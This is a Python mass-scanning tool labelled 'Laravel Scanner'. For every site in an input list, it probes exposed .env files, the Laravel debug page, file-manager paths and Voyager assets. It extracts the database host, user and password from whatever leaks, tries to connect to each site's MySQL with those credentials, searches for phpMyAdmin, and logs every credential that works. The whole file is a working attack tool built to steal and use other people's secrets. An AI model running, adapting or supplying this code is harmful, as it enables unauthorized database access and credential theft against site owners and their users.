# Laravel Scanner - https://github.com/AnggaTechI

import requests
import re
import pymysql
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Semaphore, Thread
from queue import Queue
import time
import logging
from urllib.parse import urlparse

MAX_WORKERS = 10             
MAX_REQUESTS_PER_SECOND = 20   
REQUEST_TIMEOUT = 10           
USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'
INPUT_FILE = 'list.txt'         

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
RESET = '\033[0m'

PATHS_TO_CHECK = [
    ("/packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/admin/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/core/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/backend/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/app/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/laravel/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/beta/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/config/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/kyc/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/prod/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/api/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/assets/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/new/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/docker/./packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder2025.txt"),
    ("/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/admin/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/core/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/backend/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/app/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/laravel/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/beta/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/config/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/kyc/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/prod/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/api/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/assets/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/new/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/docker/./vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/vendor/packages/barryvdh/elfinder/css/elfinder.min.css", "result_elfinder.txt"),
    ("/public/vendor/laravel-filemanager/css/cropper.min.css", "result_filemanager2025.txt"),
    ("/admin/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/core/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/backend/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/app/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/laravel/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/beta/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/config/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/kyc/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/prod/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/api/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/assets/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/new/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/docker/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/@core/./.env", "APP_KEY=", "result_env2025.txt"),
    ("/file-manager/ckeditor", "vendor/file-manager/css/file-manager.css", "result_filemanager_ckeditor_2025.txt"),
    ("/file-manager/tinymce", "vendor/file-manager/css/file-manager.css", "result_filemanager_tinymce_2025.txt"),
    ("/admin/voyager-assets", "vendor/tcg/voyager", "result_voyager2025.txt"),
    ("/client/manifest.json", None, "result_vebto2025.txt"),
]

DB_PATTERNS = {
    'DB_HOST': re.compile(r'DB_HOST\s*=\s*([^\s\n]+)'),
    'DB_USERNAME': re.compile(r'DB_USERNAME\s*=\s*([^\s\n]+)'),
    'DB_PASSWORD': re.compile(r'DB_PASSWORD\s*=\s*([^\s\n]+)'),
}

log_queue = Queue()

rate_limiter = Semaphore(MAX_REQUESTS_PER_SECOND)

def print_green(msg):
    print(f"{GREEN}{msg}{RESET}")

def print_red(msg):
    print(f"{RED}{msg}{RESET}")

def print_yellow(msg):
    print(f"{YELLOW}{msg}{RESET}")

def ensure_http_prefix(url):
    if not url.startswith(('http://', 'https://')):
        return 'http://' + url
    return url

def log_result(filename, message):
    log_queue.put((filename, message))

def writer_thread():
    while True:
        filename, message = log_queue.get()
        if filename is None:
            break
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(message + '\n')
        log_queue.task_done()

def safe_request(session, method, url, **kwargs):
    kwargs.setdefault('timeout', REQUEST_TIMEOUT)
    kwargs.setdefault('headers', {'User-Agent': USER_AGENT})
    kwargs.setdefault('allow_redirects', False)

    rate_limiter.acquire()
    time.sleep(1 / MAX_REQUESTS_PER_SECOND)
    rate_limiter.release()

    try:
        response = session.request(method, url, **kwargs)
        return response
    except requests.exceptions.RequestException as e:
        print_red(f"Error accessing {url}: {e}")
        return None

def check_cookie(session, url):
    resp = safe_request(session, 'GET', url)
    if not resp:
        return False

    cookies = resp.cookies.get_dict()
    for cookie_name in cookies:
        if 'XSRF-TOKEN' in cookie_name:
            print_green(f"XSRF-TOKEN found in cookies for {url}")
            log_result('laravel_websites2025.txt', url)
            return True

    print_yellow(f"XSRF-TOKEN not found in cookies for {url}")
    return False

def check_and_save(session, url, keyword, result_file):
    resp = safe_request(session, 'GET', url)
    if not resp:
        return False

    if resp.history:
        print_yellow(f"{url} redirected to {resp.url}, marking as invalid.")
        return False

    if resp.status_code == 200:
        if keyword is None or keyword in resp.text:
            log_result(result_file, f'Keyword "{keyword}" found in {url}')
            print_green(f'Keyword "{keyword}" found in {url} and saved to {result_file}')
            if keyword == "APP_KEY=":
                process_database_extraction(resp.text, url)
            return True
        else:
            print_yellow(f'Keyword "{keyword}" not found in {url}, marking as invalid.')
    else:
        print_red(f'Failed to access {url}. Status code: {resp.status_code}')
    return False

def check_debug_laravel(session, url):
    resp = safe_request(session, 'POST', url, data={"0x[]": "janc0xsec"})
    if resp and "APP_KEY=" in resp.text:
        log_result("result_debuglaravel2025.txt", f"{url} has Laravel debug info (APP_KEY leak)")
        print_green(f"[+] Laravel debug exposed at {url}")
        process_database_extraction(resp.text, url)

def extract_db_credentials(text):
    creds = {}
    for key, pattern in DB_PATTERNS.items():
        m = pattern.search(text)
        if m:
            creds[key] = m.group(1).strip(' "\'')
    return creds

def try_connect_db(host, user, password):
    try:
        conn = pymysql.connect(
            host=host,
            user=user,
            password=password,
            connect_timeout=5
        )
        conn.close()
        return True
    except Exception as e:
        print_red(f"Failed to connect: {host} - {e}")
        return False

def check_phpmyadmin(session, url, db_user, db_pass):
    paths = ["/phpmyadmin", "/pma", "/dbadmin", "/phpMyAdmin", "/mysql"]
    for path in paths:
        full = url.rstrip('/') + path
        resp = safe_request(session, 'GET', full)
        if resp and '<a href="./url.php?url=https%3A%2F%2Fwww.phpmyadmin.net%2F"' in resp.text:
            log_result("result_phpmyadmin.txt", f"{url} has phpMyAdmin | User: {db_user} | Pass: {db_pass}")
            print_green(f"[+] phpMyAdmin found at {full}")
            return True
    return False

def process_database_extraction(text, target_url):
    if not text:
        return
    creds = extract_db_credentials(text)
    if not creds:
        return

    db_host = creds.get('DB_HOST', '')
    db_user = creds.get('DB_USERNAME', '')
    db_pass = creds.get('DB_PASSWORD', '')

    if db_host in ['127.0.0.1', 'localhost'] and db_user and db_pass:
        domain = target_url.replace('http://', '').replace('https://', '').split('/')[0]
        print_yellow(f"[*] Testing remote DB using domain: {domain}")
        if try_connect_db(domain, db_user, db_pass):
            log_result("result_database_remote.txt", f"{target_url} => Remote DB OK | USER: {db_user} | PASS: {db_pass}")
            print_green(f"[+] Remote DB access success for {domain}")
        with requests.Session() as s:
            s.headers.update({'User-Agent': USER_AGENT})
            check_phpmyadmin(s, target_url, db_user, db_pass)

def process_website(session, website):
    full_url = ensure_http_prefix(website)
    check_debug_laravel(session, full_url)
    if check_cookie(session, full_url):
        for path, keyword, outfile in PATHS_TO_CHECK:
            target = full_url + path
            check_and_save(session, target, keyword, outfile)
    else:
        print_yellow(f"{full_url} does not have a valid XSRF-TOKEN cookie, skipping...")

def main():
    logging.getLogger("urllib3").setLevel(logging.ERROR)

    writer = Thread(target=writer_thread, daemon=True)
    writer.start()

    def session_factory():
        s = requests.Session()
        s.headers.update({'User-Agent': USER_AGENT})
        s.verify = False 
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        return s

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        with open(INPUT_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                website = line.strip()
                if not website:
                    continue
                futures.append(executor.submit(process_website, session_factory(), website))
                if len(futures) > MAX_WORKERS * 2:
                    for done in as_completed(futures):
                        futures.remove(done)
                        break
        for future in as_completed(futures):
            future.result()

    log_queue.put((None, None))
    writer.join(timeout=5)

if __name__ == "__main__":
    main()
